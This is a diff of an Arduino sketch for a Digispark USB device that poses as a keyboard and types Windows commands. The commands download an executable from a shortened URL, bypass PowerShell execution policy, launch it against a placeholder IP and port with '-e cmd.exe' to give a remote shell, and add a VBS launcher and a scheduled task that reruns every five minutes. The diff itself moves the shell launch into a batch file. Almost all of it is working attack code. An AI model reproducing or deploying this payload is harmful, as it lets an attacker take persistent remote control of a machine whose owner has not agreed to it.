@@ -14,7 +14,7 @@ void setup() {
   DigiKeyboard.print("cd / & mkdir System & cd System & echo (wget 'https://tinyurl.com/y88r9epk' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(100);
-  DigiKeyboard.print("echo START /MIN a.exe IP PORT -e cmd.exe -d ^& exit > start.bat");
+  DigiKeyboard.print("echo START /MIN a.exe [IP] [PORT] -e cmd.exe -d ^& exit > d.bat");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(100);
   DigiKeyboard.print("echo Set WshShell = CreateObject('WScript.Shell') > c.vbs");
@@ -29,7 +29,7 @@ void setup() {
   DigiKeyboard.print("schtasks /create /tn TaskSystem /tr C:/System/c.vbs /sc minute /mo 5");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(75);
-  DigiKeyboard.print("START /MIN a.exe [IP] [PORT] -e cmd.exe -d & exit");
+  DigiKeyboard.print("d.bat & exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
 void loop() {
